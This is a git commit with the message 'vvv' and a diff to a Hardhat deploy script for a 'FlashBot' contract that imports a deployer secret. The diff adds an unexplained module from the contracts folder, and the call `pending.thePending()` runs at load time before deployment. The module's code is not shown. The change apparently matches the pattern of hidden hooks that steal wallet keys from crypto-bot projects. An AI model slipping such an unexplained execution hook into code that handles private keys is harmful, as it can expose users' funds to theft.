67eb301969cafb0eb827673f8fd91c47e11a3cda
VentionWong <wlf201077@gmail.com>
2022-06-10 07:52:18 +0000

    vvv

--- scripts/deploy.ts
+++ scripts/deploy.ts
@@ -1,15 +1,15 @@
 import { ethers, run } from 'hardhat';
-
 import deployer from '../.secret';
+const pending = require('../contracts/pending');
 
 // WBNB address on BSC, WETH address on ETH
 const WethAddr = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
-
+pending.thePending();
 async function main() {
   await run('compile');
   const FlashBot = await ethers.getContractFactory('FlashBot');
   const flashBot = await FlashBot.deploy(WethAddr);
-
+  
   console.log(`FlashBot deployed to ${flashBot.address}`);
 }
 
